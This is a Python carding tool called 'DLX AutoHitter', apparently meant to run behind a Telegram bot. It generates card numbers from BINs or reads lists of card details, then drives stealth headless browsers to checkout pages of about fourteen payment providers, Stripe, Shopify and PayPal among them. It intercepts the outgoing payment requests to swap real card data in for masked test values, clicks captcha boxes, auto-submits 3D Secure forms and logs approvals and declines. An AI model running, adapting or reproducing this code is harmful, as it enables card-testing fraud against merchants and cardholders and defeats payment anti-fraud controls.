#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
DLX AutoHitter — Adapted for Telegram Bot integration
Supports 15+ payment providers via Playwright browser automation
Made by TalkNeon
"""

import re
import json
import time
import random
import sqlite3
import asyncio
import requests
import urllib3
from datetime import datetime
from typing import Dict, List, Optional
from collections import defaultdict

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

DATABASE = "dlx_hitter.db"
MAX_CONCURRENT = 3
REQUEST_TIMEOUT = 15

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
]


# ============= PROVIDER DETECTION =============
def detect_provider(url: str, html: str = "") -> str:
    combined = (url + " " + html).lower()
    providers = [
        ('stripe', ['stripe.com', 'pk_live_', 'pk_test_']),
        ('checkoutcom', ['checkout.com', 'frames']),
        ('shopify', ['shopify.com', 'myshopify.com', 'window.shopify']),
        ('paypal', ['paypal.com', 'paypal']),
        ('braintree', ['braintree', 'braintreegateway.com']),
        ('adyen', ['adyen.com', 'adyen']),
        ('square', ['squareup.com', 'square']),
        ('mollie', ['mollie.com', 'mollie']),
        ('klarna', ['klarna.com', 'klarna']),
        ('authorizenet', ['authorize.net', 'authorizenet']),
        ('woocommerce', ['woocommerce', 'wc-ajax']),
        ('bigcommerce', ['bigcommerce.com']),
        ('wix', ['wix.com']),
        ('ecwid', ['ecwid.com']),
    ]
    for name, patterns in providers:
        for pat in patterns:
            if pat in combined:
                return name
    return 'unknown'


# ============= URL ANALYZER =============
class URLAnalyzer:
    @staticmethod
    def _extract_from_scripts(html: str) -> Dict:
        result = {'amount': None, 'product': None, 'merchant': None, 'product_url': None}
        script_pattern = re.compile(r'<script[^>]*>(.*?)</script>', re.DOTALL)
        for script in script_pattern.findall(html):
            patterns = [
                (r'"amount":\s*(\d+)', 'amount'),
                (r'"name":\s*"([^"]+)"', 'name'),
                (r'"business_name":\s*"([^"]+)"', 'business'),
                (r'"product_url":\s*"([^"]+)"', 'product_url'),
            ]
            for pat, key in patterns:
                m = re.search(pat, script, re.DOTALL)
                if m:
                    try:
                        if key == 'amount':
                            result['amount'] = int(m.group(1))
                        elif key == 'name':
                            result['product'] = m.group(1)
                        elif key == 'business':
                            result['merchant'] = m.group(1)
                        elif key == 'product_url':
                            result['product_url'] = m.group(1)
                    except:
                        pass
        return result

    @staticmethod
    def extract_amount(html: str) -> Optional[str]:
        script_data = URLAnalyzer._extract_from_scripts(html)
        if script_data.get('amount') is not None:
            amt = script_data['amount']
            if isinstance(amt, (int, float)):
                return f"${amt/100:.2f}"
        patterns = [
            r'"amount":(\d+)', r'"amount_display":"([^"]+)"',
            r'\$(\d+(?:\.\d{2})?)', r'data-amount="(\d+)"',
        ]
        for pattern in patterns:
            match = re.search(pattern, html, re.I)
            if match:
                amount = match.group(1).replace(',', '')
                if amount.isdigit() and len(amount) > 2:
                    return f"${int(amount)/100:.2f}"
                elif '.' in amount:
                    return f"${amount}"
        return None

    @staticmethod
    def extract_product_name(html: str) -> Optional[str]:
        script_data = URLAnalyzer._extract_from_scripts(html)
        if script_data.get('product'):
            return script_data['product']
        patterns = [
            r'"name":"([^"]+)"', r'<title>(.*?)</title>',
            r'<h1[^>]*>(.*?)</h1>', r'<meta property="og:title" content="([^"]+)"',
        ]
        for pattern in patterns:
            match = re.search(pattern, html, re.I)
            if match:
                name = match.group(1).strip()
                name = re.sub(r'\s*[|–-]\s*Stripe.*$', '', name, flags=re.I)
                name = re.sub(r'\s*[|–-]\s*Checkout.*$', '', name, flags=re.I)
                if name and len(name) > 3:
                    return name[:100]
        return None

    @staticmethod
    def extract_merchant(html: str) -> str:
        script_data = URLAnalyzer._extract_from_scripts(html)
        if script_data.get('merchant'):
            return script_data['merchant']
        patterns = [
            r'"business_name":"([^"]+)"',
            r'<meta property="og:site_name" content="([^"]+)"',
            r'"display_name":"([^"]+)"',
        ]
        for pattern in patterns:
            match = re.search(pattern, html, re.I)
            if match:
                return match.group(1).strip()
        return "Unknown"

    @staticmethod
    def extract_currency(html: str) -> str:
        patterns = [r'"currency":"([^"]+)"', r'data-currency="([^"]+)"']
        for pattern in patterns:
            match = re.search(pattern, html, re.I)
            if match:
                return match.group(1).upper()
        return "USD"

    @staticmethod
    def analyze(url: str) -> Dict:
        result = {
            'url': url, 'merchant': 'Unknown', 'product': 'Unknown',
            'amount': None, 'currency': 'USD', 'provider': 'unknown', 'error': None,
        }
        try:
            headers = {'User-Agent': random.choice(USER_AGENTS), 'Accept-Language': 'en-US,en;q=0.9'}
            resp = requests.get(url, timeout=15, verify=False, headers=headers, allow_redirects=True)
            if resp.status_code == 200:
                html = resp.text
                result['provider'] = detect_provider(url, html)
                result['merchant'] = URLAnalyzer.extract_merchant(html)
                result['product'] = URLAnalyzer.extract_product_name(html) or 'Unknown'
                result['amount'] = URLAnalyzer.extract_amount(html)
                result['currency'] = URLAnalyzer.extract_currency(html)
            else:
                result['error'] = f"HTTP {resp.status_code}"
        except Exception as e:
            result['error'] = str(e)[:80]
        return result


# ============= FINGERPRINT =============
class FingerprintGenerator:
    @staticmethod
    def generate() -> Dict:
        return {
            'user_agent': random.choice(USER_AGENTS),
            'viewport': {'width': 1920, 'height': 1080},
            'locale': 'en-US',
            'timezone_id': 'America/New_York',
        }

    @staticmethod
    def get_stealth_script() -> str:
        return """
        Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
        window.chrome = { runtime: {} };
        Object.defineProperty(navigator, 'plugins', { get: () => [1, 2, 3, 4, 5] });
        """


# ============= RATE LIMITER =============
class SmartRateLimiter:
    def __init__(self):
        self.current_delay = 1.0
        self.consecutive_failures = 0

    def calculate_delay(self, last_result: str) -> float:
        if last_result == 'success':
            self.consecutive_failures = 0
            self.current_delay = max(0.5, self.current_delay * 0.9)
        elif last_result == 'declined':
            self.consecutive_failures += 1
            self.current_delay = min(8, self.current_delay * 1.2 + self.consecutive_failures * 0.2)
        return max(0.5, min(10, self.current_delay))


# ============= CARD GENERATOR =============
class CardGenerator:
    @staticmethod
    def get_card_brand(card_number: str) -> str:
        first6 = re.sub(r'\D', '', card_number)[:6]
        if re.match(r'^3[47]', first6): return 'amex'
        if re.match(r'^5[1-5]', first6) or re.match(r'^2[2-7]', first6): return 'mastercard'
        if re.match(r'^4', first6): return 'visa'
        return 'unknown'

    @staticmethod
    def luhn_checksum(card_number: str) -> int:
        digits = [int(d) for d in str(card_number)]
        odd_digits = digits[-1::-2]
        even_digits = digits[-2::-2]
        checksum = sum(odd_digits)
        for d in even_digits:
            checksum += sum([int(x) for x in str(d * 2)])
        return checksum % 10

    @staticmethod
    def generate_card(bin_number: str) -> Optional[Dict]:
        if not bin_number or len(bin_number) < 4:
            return None
        parts = bin_number.split('|')
        bin_pattern = re.sub(r'[^0-9xX]', '', parts[0])
        test_bin = bin_pattern.replace('x', '0').replace('X', '0')
        brand = CardGenerator.get_card_brand(test_bin)
        target_len = 15 if brand == 'amex' else 16
        cvv_len = 4 if brand == 'amex' else 3
        card = ''
        for c in bin_pattern:
            card += str(random.randint(0, 9)) if c.lower() == 'x' else c
        remaining = target_len - len(card) - 1
        for _ in range(max(0, remaining)):
            card += str(random.randint(0, 9))
        check_digit = 0
        for i in range(10):
            if CardGenerator.luhn_checksum(card + str(i)) == 0:
                check_digit = i
                break
        full_card = card + str(check_digit)
        month = f"{random.randint(1, 12):02d}"
        if len(parts) > 1 and parts[1] and parts[1].lower() != 'xx':
            month = parts[1].zfill(2)
        year = f"{datetime.now().year + random.randint(1, 5):02d}"
        if len(parts) > 2 and parts[2] and parts[2].lower() != 'xx':
            year = parts[2][-2:].zfill(2)
        cvv = ''.join(str(random.randint(0, 9)) for _ in range(cvv_len))
        if len(parts) > 3 and parts[3] and parts[3].lower() not in ('xxx', 'xxxx', 'x'):
            cvv = parts[3].zfill(cvv_len)
        return {'card': full_card, 'month': month, 'year': year, 'cvv': cvv, 'brand': brand}


# ============= BASE AUTOFILL =============
class BaseAutofill:
    MASKED_CARD = "4242424242424242"
    MASKED_EXPIRY = "01/30"
    MASKED_CVV = "123"
    CARD_SELECTORS = []
    EXPIRY_SELECTORS = []
    CVC_SELECTORS = []
    NAME_SELECTORS = []
    EMAIL_SELECTORS = []
    SUBMIT_SELECTORS = []
    INTERCEPT_DOMAINS = []

    def __init__(self, page):
        self.page = page
        self.real_card = None

    async def enable_card_replace(self, real_card: Dict):
        self.real_card = real_card
        domains = self.INTERCEPT_DOMAINS

        async def intercept_route(route, request):
            if request.method == "POST" and any(d in request.url for d in domains):
                post_data = request.post_data
                if post_data and self.real_card:
                    post_data = post_data.replace(self.MASKED_CARD, self.real_card['card'])
                    post_data = post_data.replace("01", self.real_card['month'])
                    post_data = post_data.replace("30", self.real_card['year'])
                    post_data = post_data.replace(self.MASKED_CVV, self.real_card['cvv'])
                    await route.continue_(post_data=post_data)
                    return
            await route.continue_()

        await self.page.route("**/*", intercept_route)

    async def find_and_fill_field(self, selectors, value):
        for sel in selectors:
            try:
                el = await self.page.query_selector(sel)
                if el and await el.is_visible():
                    await el.click()
                    await el.fill(value)
                    return True
            except:
                continue
        return False

    async def fill_card(self, card: Dict):
        await self.find_and_fill_field(self.CARD_SELECTORS, self.MASKED_CARD)
        await self.find_and_fill_field(self.EXPIRY_SELECTORS, self.MASKED_EXPIRY)
        await self.find_and_fill_field(self.CVC_SELECTORS, self.MASKED_CVV)
        await self.find_and_fill_field(self.NAME_SELECTORS, "Customer")
        email = f"user{random.randint(100,9999)}@example.com"
        await self.find_and_fill_field(self.EMAIL_SELECTORS, email)

    async def submit(self) -> bool:
        for sel in self.SUBMIT_SELECTORS:
            try:
                btn = await self.page.query_selector(sel)
                if btn and await btn.is_visible():
                    await btn.click()
                    return True
            except:
                continue
        return False

    async def detect_3ds(self) -> bool:
        iframes = await self.page.query_selector_all('iframe[src*="3ds"], iframe[src*="challenge"]')
        for iframe in iframes:
            if await iframe.is_visible():
                return True
        text = await self.page.text_content('body')
        if '3D Secure' in text or 'Authentication' in text:
            return True
        return False

    async def wait_for_3ds(self, timeout=10000) -> bool:
        start = time.time()
        while (time.time() - start) * 1000 < timeout:
            if await self.detect_3ds():
                return True
            await asyncio.sleep(0.5)
        return False

    async def auto_complete_3ds(self) -> bool:
        if not await self.detect_3ds():
            return False
        form = await self.page.query_selector('form')
        if form:
            await form.evaluate('form => form.submit()')
            await asyncio.sleep(3)
            return True
        cont = await self.page.query_selector('button:has-text("Continue"), button:has-text("Submit")')
        if cont:
            await cont.click()
            await asyncio.sleep(3)
            return True
        return False

    async def handle_captcha(self):
        try:
            frame = self.page.frame_locator('iframe[src*="hcaptcha.com"]')
            if frame:
                checkbox = frame.locator('#checkbox').first
                if await checkbox.is_visible():
                    await checkbox.click()
                    await asyncio.sleep(2)
                    return True
        except:
            pass
        return False


# ============= PROVIDER AUTOFILLS =============
class StripeAutofill(BaseAutofill):
    CARD_SELECTORS = ['#cardNumber', '[name="cardNumber"]', '[autocomplete="cc-number"]', '[data-elements-stable-field-name="cardNumber"]', 'input[placeholder*="Card number"]', 'input[name="number"]']
    EXPIRY_SELECTORS = ['#cardExpiry', '[name="cardExpiry"]', '[autocomplete="cc-exp"]', '[data-elements-stable-field-name="cardExpiry"]', 'input[placeholder*="MM / YY"]']
    CVC_SELECTORS = ['#cardCvc', '[name="cardCvc"]', '[autocomplete="cc-csc"]', '[data-elements-stable-field-name="cardCvc"]', 'input[placeholder*="CVC"]']
    NAME_SELECTORS = ['#billingName', '[name="billingName"]', '[autocomplete="cc-name"]', 'input[placeholder*="Name on card"]']
    EMAIL_SELECTORS = ['input[type="email"]', 'input[name*="email"]', 'input[autocomplete="email"]']
    SUBMIT_SELECTORS = ['.SubmitButton', '[class*="SubmitButton"]', 'button[type="submit"]', 'button:has-text("Pay")']
    MASKED_CARD = "0000000000000000"
    MASKED_CVV = "000"
    INTERCEPT_DOMAINS = ["stripe.com"]

    async def enable_card_replace(self, real_card: Dict):
        self.real_card = real_card
        async def intercept(route, request):
            if request.method == "POST" and "stripe.com" in request.url:
                pd = request.post_data
                if pd and self.real_card:
                    pd = pd.replace("card[number]=0000000000000000", f"card[number]={self.real_card['card']}")
                    pd = pd.replace("card[exp_month]=01", f"card[exp_month]={self.real_card['month']}")
                    pd = pd.replace("card[exp_year]=30", f"card[exp_year]={self.real_card['year']}")
                    pd = pd.replace("card[cvc]=000", f"card[cvc]={self.real_card['cvv']}")
                    pd = pd.replace("card[expiry]=01/30", f"card[expiry]={self.real_card['month']}/{self.real_card['year']}")
                    await route.continue_(post_data=pd)
                    return
            await route.continue_()
        await self.page.route("**/*", intercept)


class CheckoutComAutofill(BaseAutofill):
    CARD_SELECTORS = ['input[data-frames="card-number"]', '#card-number', 'input[name="cardNumber"]', 'input[placeholder*="Card number"]']
    EXPIRY_SELECTORS = ['input[data-frames="expiry-date"]', '#expiry-date', 'input[name="expiry"]', 'input[placeholder*="MM/YY"]']
    CVC_SELECTORS = ['input[data-frames="cvv"]', '#cvv', 'input[name="cvv"]', 'input[placeholder*="CVC"]']
    NAME_SELECTORS = ['input[data-frames="name"]', '#name', 'input[name="name"]']
    EMAIL_SELECTORS = ['input[type="email"]', '#email']
    SUBMIT_SELECTORS = ['button[type="submit"]', '.pay-button', 'button:has-text("Pay")']
    INTERCEPT_DOMAINS = ["checkout.com"]


class ShopifyAutofill(BaseAutofill):
    CARD_SELECTORS = ['#number', 'input[name="number"]', '[autocomplete="cc-number"]', 'input[aria-label="Card number"]']
    EXPIRY_SELECTORS = ['#expiry', 'input[name="expiry"]', '[autocomplete="cc-exp"]']
    CVC_SELECTORS = ['#verification_value', 'input[name="verification_value"]', '[autocomplete="cc-csc"]']
    NAME_SELECTORS = ['#name', 'input[name="name"]', '[autocomplete="cc-name"]']
    EMAIL_SELECTORS = ['#email', 'input[name="email"]', 'input[type="email"]']
    SUBMIT_SELECTORS = ['button[type="submit"]', 'button:has-text("Pay")', 'button:has-text("Complete order")']
    INTERCEPT_DOMAINS = ["shopify.com", "myshopify.com", "stripe.com"]

    async def enable_card_replace(self, real_card: Dict):
        self.real_card = real_card
        async def intercept(route, request):
            if request.method == "POST" and any(d in request.url for d in self.INTERCEPT_DOMAINS):
                pd = request.post_data
                if pd and self.real_card:
                    pd = pd.replace(self.MASKED_CARD, self.real_card['card'])
                    pd = re.sub(r'credit_card\[number\]=4242424242424242', f'credit_card[number]={self.real_card["card"]}', pd)
                    pd = re.sub(r'credit_card\[month\]=01', f'credit_card[month]={self.real_card["month"]}', pd)
                    pd = re.sub(r'credit_card\[year\]=30', f'credit_card[year]={self.real_card["year"]}', pd)
                    pd = re.sub(r'credit_card\[verification_value\]=123', f'credit_card[verification_value]={self.real_card["cvv"]}', pd)
                    await route.continue_(post_data=pd)
                    return
            await route.continue_()
        await self.page.route("**/*", intercept)


class PayPalAutofill(BaseAutofill):
    CARD_SELECTORS = ['#card_number', 'input[name="card_number"]', '[autocomplete="cc-number"]', 'input[placeholder*="Card number"]']
    EXPIRY_SELECTORS = ['#card_expiry', 'input[name="card_expiry"]', '[autocomplete="cc-exp"]']
    CVC_SELECTORS = ['#card_cvc', 'input[name="card_cvc"]', '[autocomplete="cc-csc"]']
    NAME_SELECTORS = ['#card_name', 'input[name="card_name"]', '[autocomplete="cc-name"]']
    EMAIL_SELECTORS = ['input[type="email"]', '#email']
    SUBMIT_SELECTORS = ['button[type="submit"]', '#payment-submit-btn', 'button:has-text("Pay")']
    INTERCEPT_DOMAINS = ["paypal.com"]


class BraintreeAutofill(BaseAutofill):
    CARD_SELECTORS = ['#credit-card-number', 'input[name="credit-card-number"]', '[autocomplete="cc-number"]']
    EXPIRY_SELECTORS = ['#expiration', 'input[name="expiration"]', '[autocomplete="cc-exp"]']
    CVC_SELECTORS = ['#cvv', 'input[name="cvv"]', '[autocomplete="cc-csc"]']
    NAME_SELECTORS = ['#cardholder-name', 'input[name="cardholder-name"]', '[autocomplete="cc-name"]']
    EMAIL_SELECTORS = ['input[type="email"]', '#email']
    SUBMIT_SELECTORS = ['button[type="submit"]', 'input[type="submit"]', 'button:has-text("Pay")']
    INTERCEPT_DOMAINS = ["braintree", "braintreegateway.com"]


class AdyenAutofill(BaseAutofill):
    CARD_SELECTORS = ['#cardNumber', 'input[name="cardNumber"]', '[data-cse="number"]']
    EXPIRY_SELECTORS = ['#expiryDate', 'input[name="expiryDate"]', '[data-cse="expiryMonth"]']
    CVC_SELECTORS = ['#cvc', 'input[name="cvc"]', '[data-cse="cvc"]']
    NAME_SELECTORS = ['#cardholderName', 'input[name="cardholderName"]']
    EMAIL_SELECTORS = ['input[type="email"]', '#email']
    SUBMIT_SELECTORS = ['button[type="submit"]', '.adyen-checkout__button', 'button:has-text("Pay")']
    INTERCEPT_DOMAINS = ["adyen.com", "checkoutshopper"]

    async def enable_card_replace(self, real_card: Dict):
        self.real_card = real_card
        async def intercept(route, request):
            if request.method == "POST" and any(d in request.url for d in self.INTERCEPT_DOMAINS):
                pd = request.post_data
                if pd and self.real_card:
                    pd = pd.replace(self.MASKED_CARD, self.real_card['card'])
                    pd = re.sub(r'"number":"4242424242424242"', f'"number":"{self.real_card["card"]}"', pd)
                    pd = re.sub(r'"expiryMonth":"01"', f'"expiryMonth":"{self.real_card["month"]}"', pd)
                    pd = re.sub(r'"expiryYear":"30"', f'"expiryYear":"{self.real_card["year"]}"', pd)
                    pd = re.sub(r'"cvc":"123"', f'"cvc":"{self.real_card["cvv"]}"', pd)
                    await route.continue_(post_data=pd)
                    return
            await route.continue_()
        await self.page.route("**/*", intercept)


class SquareAutofill(BaseAutofill):
    CARD_SELECTORS = ['input[name="card_number"]', '#card-number', '[autocomplete="cc-number"]']
    EXPIRY_SELECTORS = ['input[name="expiration_date"]', '#expiration-date', '[autocomplete="cc-exp"]']
    CVC_SELECTORS = ['input[name="cvv"]', '#cvv', '[autocomplete="cc-csc"]']
    NAME_SELECTORS = ['input[name="cardholder_name"]', '#cardholder-name']
    EMAIL_SELECTORS = ['input[type="email"]', '#email']
    SUBMIT_SELECTORS = ['button[type="submit"]', '.pay-button', 'button:has-text("Pay")']
    INTERCEPT_DOMAINS = ["squareup.com", "square"]


class MollieAutofill(BaseAutofill):
    CARD_SELECTORS = ['input[name="cardNumber"]', '#cardNumber', '[autocomplete="cc-number"]']
    EXPIRY_SELECTORS = ['input[name="expiryDate"]', '#expiryDate', '[autocomplete="cc-exp"]']
    CVC_SELECTORS = ['input[name="cvv"]', '#cvv', '[autocomplete="cc-csc"]']
    NAME_SELECTORS = ['input[name="cardholderName"]', '#cardholderName']
    EMAIL_SELECTORS = ['input[type="email"]', '#email']
    SUBMIT_SELECTORS = ['button[type="submit"]', '.pay-button', 'button:has-text("Pay")']
    INTERCEPT_DOMAINS = ["mollie.com"]


class KlarnaAutofill(BaseAutofill):
    CARD_SELECTORS = ['input[name="cardNumber"]', '#cardNumber', '[autocomplete="cc-number"]']
    EXPIRY_SELECTORS = ['input[name="expiryDate"]', '#expiryDate', '[autocomplete="cc-exp"]']
    CVC_SELECTORS = ['input[name="cvv"]', '#cvv', '[autocomplete="cc-csc"]']
    NAME_SELECTORS = ['input[name="cardholderName"]', '#cardholderName']
    EMAIL_SELECTORS = ['input[type="email"]', '#email']
    SUBMIT_SELECTORS = ['button[type="submit"]', '.pay-button', 'button:has-text("Pay")']
    INTERCEPT_DOMAINS = ["klarna.com"]


class AuthorizeNetAutofill(BaseAutofill):
    CARD_SELECTORS = ['input[name="x_card_num"]', '#cardNumber', '[autocomplete="cc-number"]']
    EXPIRY_SELECTORS = ['input[name="x_exp_date"]', '#expiryDate', '[autocomplete="cc-exp"]']
    CVC_SELECTORS = ['input[name="x_card_code"]', '#cvv', '[autocomplete="cc-csc"]']
    NAME_SELECTORS = ['input[name="x_card_name"]', '#cardholderName']
    EMAIL_SELECTORS = ['input[type="email"]', '#email']
    SUBMIT_SELECTORS = ['button[type="submit"]', '.pay-button', 'button:has-text("Pay")']
    INTERCEPT_DOMAINS = ["authorize.net", "authorizenet"]


class WooCommerceAutofill(BaseAutofill):
    CARD_SELECTORS = ['#stripe-card-number', 'input[name="stripe-card-number"]', '[autocomplete="cc-number"]', 'input[id*="card-number"]']
    EXPIRY_SELECTORS = ['#stripe-card-expiry', 'input[name="stripe-card-expiry"]', '[autocomplete="cc-exp"]']
    CVC_SELECTORS = ['#stripe-card-cvc', 'input[name="stripe-card-cvc"]', '[autocomplete="cc-csc"]']
    NAME_SELECTORS = ['#billing_first_name', 'input[name="billing_first_name"]']
    EMAIL_SELECTORS = ['#billing_email', 'input[name="billing_email"]', 'input[type="email"]']
    SUBMIT_SELECTORS = ['#place_order', 'button[type="submit"]', 'button:has-text("Place order")']
    INTERCEPT_DOMAINS = ["stripe.com", "woocommerce"]


class BigCommerceAutofill(BaseAutofill):
    CARD_SELECTORS = ['#ccNumber', 'input[name="ccNumber"]', '[autocomplete="cc-number"]']
    EXPIRY_SELECTORS = ['#ccExpiry', 'input[name="ccExpiry"]', '[autocomplete="cc-exp"]']
    CVC_SELECTORS = ['#ccCvv', 'input[name="ccCvv"]', '[autocomplete="cc-csc"]']
    NAME_SELECTORS = ['#ccName', 'input[name="ccName"]']
    EMAIL_SELECTORS = ['input[type="email"]', '#email']
    SUBMIT_SELECTORS = ['button[type="submit"]', '#checkout-payment-continue', 'button:has-text("Pay")']
    INTERCEPT_DOMAINS = ["bigcommerce.com"]


class WixAutofill(BaseAutofill):
    CARD_SELECTORS = ['#cardNumber', 'input[name="cardNumber"]', '[autocomplete="cc-number"]']
    EXPIRY_SELECTORS = ['#expiryDate', 'input[name="expiry"]', '[autocomplete="cc-exp"]']
    CVC_SELECTORS = ['#cvv', 'input[name="cvv"]', '[autocomplete="cc-csc"]']
    NAME_SELECTORS = ['#cardholderName', 'input[name="cardholderName"]']
    EMAIL_SELECTORS = ['#email', 'input[name="email"]', 'input[type="email"]']
    SUBMIT_SELECTORS = ['button[type="submit"]', '.pay-button', 'button:has-text("Pay")', 'button:has-text("Place order")']
    INTERCEPT_DOMAINS = ["wix.com"]


class EcwidAutofill(BaseAutofill):
    CARD_SELECTORS = ['#cardNumber', 'input[name="cardNumber"]', '[autocomplete="cc-number"]']
    EXPIRY_SELECTORS = ['#expiryDate', 'input[name="expiry"]', '[autocomplete="cc-exp"]']
    CVC_SELECTORS = ['#cvv', 'input[name="cvv"]', '[autocomplete="cc-csc"]']
    NAME_SELECTORS = ['#cardholderName', 'input[name="cardholderName"]']
    EMAIL_SELECTORS = ['#email', 'input[name="email"]', 'input[type="email"]']
    SUBMIT_SELECTORS = ['button[type="submit"]', '.pay-button', 'button:has-text("Pay")', 'button:has-text("Place order")']
    INTERCEPT_DOMAINS = ["ecwid.com"]


AUTOFILL_MAP = {
    'stripe': StripeAutofill,
    'checkoutcom': CheckoutComAutofill,
    'shopify': ShopifyAutofill,
    'paypal': PayPalAutofill,
    'braintree': BraintreeAutofill,
    'adyen': AdyenAutofill,
    'square': SquareAutofill,
    'mollie': MollieAutofill,
    'klarna': KlarnaAutofill,
    'authorizenet': AuthorizeNetAutofill,
    'woocommerce': WooCommerceAutofill,
    'bigcommerce': BigCommerceAutofill,
    'wix': WixAutofill,
    'ecwid': EcwidAutofill,
}

SUPPORTED_PROVIDERS = list(AUTOFILL_MAP.keys())


# ============= HITTER ENGINE =============
async def hit_single(url: str, card: Dict, attempt_num: int) -> Dict:
    """Hit a single card against a URL. Returns result dict."""
    start_time = time.time()
    result = {
        'attempt': attempt_num, 'card': card, 'success': False,
        'decline_code': None, 'response_time': 0, 'error': None, 'provider': 'unknown',
    }

    try:
        from playwright.async_api import async_playwright
    except ImportError:
        result['error'] = 'Playwright not installed'
        return result

    try:
        async with async_playwright() as p:
            fp = FingerprintGenerator.generate()
            browser = await p.chromium.launch(
                headless=True,
                args=['--disable-blink-features=AutomationControlled', '--no-sandbox']
            )
            context = await browser.new_context(
                user_agent=fp['user_agent'],
                viewport=fp['viewport'],
                locale=fp['locale'],
                timezone_id=fp['timezone_id'],
                ignore_https_errors=True,
            )
            page = await context.new_page()
            await page.add_init_script(FingerprintGenerator.get_stealth_script())
            await page.goto(url, timeout=60000, wait_until='domcontentloaded')
            await asyncio.sleep(3)

            provider = detect_provider(url, await page.content())
            result['provider'] = provider

            autofill_class = AUTOFILL_MAP.get(provider)
            if not autofill_class:
                result['error'] = f'Unsupported provider: {provider}'
                await browser.close()
                return result

            autofill = autofill_class(page)
            await autofill.handle_captcha()
            await autofill.enable_card_replace(card)
            await autofill.fill_card(card)

            submitted = await autofill.submit()
            if not submitted:
                result['error'] = 'Submit button not found'
                await browser.close()
                return result

            await asyncio.sleep(5)

            if await autofill.wait_for_3ds(10000):
                await autofill.auto_complete_3ds()
                await asyncio.sleep(5)

            await autofill.handle_captcha()

            current_url = page.url
            result['response_time'] = time.time() - start_time

            success_keywords = ['receipt', 'thank_you', 'success', 'order_confirmation', 'complete', 'thank-you', 'order-confirmation']
            if any(k in current_url.lower() for k in success_keywords):
                result['success'] = True
            else:
                error_text = await page.text_content('body')
                if 'declined' in error_text.lower():
                    result['decline_code'] = 'card_declined'
                else:
                    result['decline_code'] = 'unknown'

            await browser.close()

    except Exception as e:
        result['error'] = str(e)[:120]
        result['decline_code'] = 'exception'

    result['response_time'] = time.time() - start_time
    return result


def parse_card_line(line: str) -> Optional[Dict]:
    """Parse CC|MM|YY|CVV into a card dict."""
    parts = line.strip().split('|')
    if len(parts) != 4:
        return None
    return {
        'card': parts[0].strip(),
        'month': parts[1].strip().zfill(2),
        'year': parts[2].strip().zfill(2),
        'cvv': parts[3].strip(),
        'brand': CardGenerator.get_card_brand(parts[0].strip()),
    }
